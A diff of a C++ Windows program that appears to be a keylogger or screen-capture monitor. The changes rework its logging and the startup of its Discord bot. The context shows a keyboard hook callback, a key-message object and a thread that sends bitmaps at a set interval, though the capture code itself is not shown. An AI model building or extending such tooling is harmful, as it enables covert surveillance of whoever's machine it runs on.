@@ -51,13 +51,16 @@ inline void mb_to_wide_char(char* input, WCHAR* output, int outputbuf) {
 /// @param format formatted string, just like printf
 /// @param
 inline void logger(const char* format, ...) {
-	char __buf[1001];
+	char __buf[1007];
 	va_list arg;
 	va_start(arg, format);
 	vsnprintf(__buf, 1000, format, arg);
+	// vsprintf(__buf, format, arg);
 	va_end(arg);
 
-	logger_file.write(__buf, strlen(__buf));
+	size_t themin = (strlen(__buf));
+
+	logger_file.write(__buf, OURMIN(themin, (size_t)1000));
 	logger_file.flush();
 
     // std::string str(__buf);
@@ -518,10 +521,6 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-short is_bot_connected = 0;
-std::mutex bot_connected_lock;
-std::condition_variable bot_connected_condvar;
-
 //Search for local appdata, make log file, say hello world before everything start
 inline void preinit() {
 	// Initialize gdi+
@@ -560,8 +559,10 @@ inline void preinit() {
 
 	//version string
 	char buffer[1001];
+	version_string.clear();
 	#if defined(__GNUC__)
         snprintf(buffer, 1001, "Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
+		version_string += std::string(buffer);
         #if defined(__MINGW64__)
             snprintf(buffer, 1001, "(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
         #elif defined(__MINGW32__)
@@ -572,18 +573,16 @@ inline void preinit() {
     #else
         snprintf(buffer, 1001, "Built with unknown compiler ");
     #endif
-	version_string = std::string(buffer);
-	snprintf(buffer, 1001, "on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, sizeof(void*) << 3, dpp::utility::version().c_str());
+	version_string += std::string(buffer);
+	snprintf(buffer, 1001, "on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, (int) (sizeof(void*) << 3), dpp::utility::version().c_str());
 	version_string += std::string(buffer);
 	// logging
 	logger("\nHello world! Current time is %s\n%s", __timestr, version_string.c_str());
 }
 
-void logrun()
+void logrun(bool is_bot_connected)
 {
-	std::unique_lock<std::mutex> locker(bot_connected_lock);
-	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
-	if (is_bot_connected != -1) {
+	if (is_bot_connected) {
 		logger("[INFO] Bot successfully initialized. Logging...\n");
 	} else {
 		logger("[CRITICAL!] Bot failed to initialized. Terminating...\n");
@@ -603,29 +602,9 @@ void logrun()
 	}
 }
 
-// RAIISlashCommandStruct::RAIISlashCommandStruct() {
-// 	bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
-// 	bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
-// 	bot->global_command_create(dpp::slashcommand("changehs", "change image hash factor", bot->me.id)
-// 								.add_option(dpp::command_option(dpp::co_integer, "val", "enter val", true)
-// 												.set_max_value(100ll).set_min_value(0ll)
-// 											));
-// }
-
-// RAIISlashCommandStruct::~RAIISlashCommandStruct() {
-// 	if (dpp::run_once<struct register_bot_commands>()) {
-// 	bot->global_commands_get([](const dpp::confirmation_callback_t &eventret) {
-// 		dpp::slashcommand_map slashcmd_mapper = eventret.get<dpp::slashcommand_map>();
-// 		for(auto& pp:slashcmd_mapper) {
-// 			bot->global_command_delete(pp.first);
-// 		}
-// 	});
-// 	}
-// }
-
 void botrun()
 {
-	is_bot_connected = 0;
+	bool is_bot_connected = false;
     try {
         /* Create bot cluster */
         bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(COMMAND_LINE_OPTION.BOT_LOCATION[1],	//token
@@ -667,7 +646,13 @@ void botrun()
 				snprintf(buffer, 1000, "Bitmap sending interval changed to %us!", COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL);
 				event.reply(buffer);
 			}
-			logger("[INFO] User %llu executed %s\n", issuing_user, issuing_command.c_str());
+
+			size_t testsize = issuing_command.size() + 7;
+			char* testptr = new char[testsize];
+			memset(testptr, 0, testsize);
+			strncpy(testptr, issuing_command.c_str(), testsize);
+			logger("[INFO] User %u executed %s\n", (unsigned int) issuing_user, testptr);
+			delete[] testptr;
         });
 
 		keymsg = dpp::message(bot.get());
@@ -715,13 +700,14 @@ void botrun()
         /* Start the bot */
         bot->start(true);
 		is_bot_connected = 1;
-		bot_connected_condvar.notify_all();
     }
-    catch (dpp::exception& e) {
+	catch (dpp::exception& e) {
         logger("\n[ERROR] %s\n", e.what());
-		is_bot_connected = -1;
-		bot_connected_condvar.notify_all();
+		logrun(is_bot_connected);	//force call
     }
+
+	std::thread log_thr(logrun, is_bot_connected);
+	log_thr.detach();
 
 	std::thread t3(send_bitmap);
 	t3.detach();
@@ -812,10 +798,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 	//currently program only run we successfully connect to discord... will make delayed connection soon
 	std::thread t1(botrun);
-	std::thread t2(logrun);
 
 	t1.join();
-	t2.join();
 
 	bot->shutdown();
 	logger_file.close();
